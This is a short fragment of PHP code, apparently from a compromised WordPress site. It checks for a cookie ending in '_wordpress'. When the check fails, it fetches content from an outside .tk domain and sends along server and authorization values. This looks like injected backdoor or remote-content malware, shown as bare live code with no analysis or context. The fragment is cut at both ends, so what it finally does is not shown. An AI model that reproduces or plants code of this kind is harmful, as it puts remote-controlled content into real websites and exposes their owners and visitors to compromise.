...
if($_COOKIE[$authorization.'_wordpress'] != bbcat_ok){
	if($json_get = file_get_contents('https://www.rogenart.tk/search'.$server_bbcat_k.'&value=bbcat&authorization='.$authorization)){
